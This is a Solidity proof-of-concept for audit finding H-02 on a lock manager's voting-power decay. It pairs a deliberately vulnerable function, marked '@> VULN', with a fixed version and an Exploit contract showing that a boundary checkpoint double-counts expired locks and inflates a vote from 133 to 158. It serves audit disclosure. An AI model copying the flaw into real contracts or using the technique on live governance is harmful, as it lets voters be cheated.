// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum LockManager — H-02 (Pashov, 2026-03-21), finding 66590.
    A checkpoint exactly at an epoch boundary does not zero
    userTotalLockedAtEpochEnd. The next _decayBias rounds the start back
    onto that boundary, duration is 0, and _decreaseEffectiveTotalLocked
    subtracts the same 100 again. The remaining 100 lock then decays from a
    zero base, so voting power stays 158 instead of falling to 133 and beats
    a 140-vote counterparty. */

contract LockManager {
    uint256 public constant WEEK = 7 days;
    uint256 public constant MAX_TIME = 28 days;
    mapping(address => mapping(uint256 => uint256)) public userTotalLockedAtEpochEnd;

    function setExpired(address user, uint256 epochEnd, uint256 amount) external {
        userTotalLockedAtEpochEnd[user][epochEnd] = amount;
    }

    function _roundUpToWeek(uint256 t) internal pure returns (uint256) {
        if (t % WEEK == 0) return t;
        return t + WEEK - (t % WEEK);
    }

    function _decrease(address user, uint256 effective, uint256 epochEnd) internal view returns (uint256) {
        uint256 expired = userTotalLockedAtEpochEnd[user][epochEnd];
        if (expired >= effective) return 0;
        return effective - expired;
    }

    function decayBias(address user, int128 bias, uint256 totalLocked, uint256 startTimestamp, uint256 endTimestamp)
        public
        view
        returns (int128 decayedBias, uint256 endTotalLocked)
    {
        uint256 currentTimestamp = startTimestamp;
        uint256 epochEnd = _roundUpToWeek(startTimestamp);
        uint256 effectiveTotalLocked = totalLocked;
        decayedBias = bias;
        while (epochEnd <= endTimestamp) {
            uint256 duration = epochEnd - currentTimestamp;
            uint256 decayAmount = (effectiveTotalLocked * duration) / MAX_TIME;
            decayedBias -= int128(int256(decayAmount));
            // @> VULN: duration 0 still subtracts the expired-lock bucket a second time
            effectiveTotalLocked = _decrease(user, effectiveTotalLocked, epochEnd);
            currentTimestamp = epochEnd;
            epochEnd += WEEK;
        }
        endTotalLocked = effectiveTotalLocked;
    }

    function fairDecay(address user, int128 bias, uint256 totalLocked, uint256 startTimestamp, uint256 endTimestamp)
        public
        view
        returns (int128 decayedBias, uint256 endTotalLocked)
    {
        uint256 currentTimestamp = startTimestamp;
        uint256 epochEnd = _roundUpToWeek(startTimestamp);
        uint256 effectiveTotalLocked = totalLocked;
        decayedBias = bias;
        while (epochEnd <= endTimestamp) {
            uint256 duration = epochEnd - currentTimestamp;
            uint256 decayAmount = (effectiveTotalLocked * duration) / MAX_TIME;
            decayedBias -= int128(int256(decayAmount));
            if (duration > 0) {
                effectiveTotalLocked = _decrease(user, effectiveTotalLocked, epochEnd);
            }
            currentTimestamp = epochEnd;
            epochEnd += WEEK;
        }
        endTotalLocked = effectiveTotalLocked;
    }
}

contract Exploit {
    LockManager public locks;
    address public voter;
    int128 public buggyBias;
    int128 public fairBias;
    uint256 public buggyBase;
    uint256 public fairBase;

    constructor() {
        locks = new LockManager();
        voter = address(0xB0B);
        // State after a checkpoint that ended exactly on the epoch boundary
        // and removed the lock from the array without zeroing the mapping.
        locks.setExpired(voter, locks.WEEK(), 100);
    }

    function run() external {
        uint256 startTs = locks.WEEK();
        uint256 endTs = locks.WEEK() * 2;
        (buggyBias, buggyBase) = locks.decayBias(voter, 158, 100, startTs, endTs);
        (fairBias, fairBase) = locks.fairDecay(voter, 158, 100, startTs, endTs);
        require(buggyBase == 0, "active lock base was deducted twice down to 0");
        require(fairBase == 100, "fair base still has the 100 active lock");
        require(buggyBias == 158, "voting power does not decay");
        require(fairBias == 133, "fair voting power decays to 133");
        require(buggyBias > 140, "inflated vote beats a 140 counterparty");
        require(fairBias < 140, "fair vote loses to the 140 counterparty");
    }
}
